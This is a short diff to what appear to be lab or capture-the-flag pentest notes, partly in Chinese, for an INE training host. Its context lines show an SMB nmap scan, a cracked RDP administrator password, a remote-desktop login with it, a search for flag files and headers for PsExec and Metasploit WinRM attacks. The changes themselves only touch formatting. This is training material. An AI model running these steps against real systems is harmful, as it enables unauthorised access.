@@ -21,7 +21,6 @@
 	powershell : Get-ChildItem -Path C:\ -Filter "flag*" -Recurse
 
 ## Windows:SMB Server PSexec
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -p445 --script smb-protocols demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	尋找所有有效使用者及其密碼 :
@@ -64,8 +63,8 @@
 	[3333][rdp] host: demo.ine.local   login: administrator   password: qwertyuiop
 
 	xfreerdp /u:administrator /p:qwertyuiop /v:demo.ine.local:3333
+ 
 ## WinRM: Exploitation with Metasploit
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
 	nmap --top-ports 7000 demo.ine.local
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
 	尋找有效使用者及其密碼:
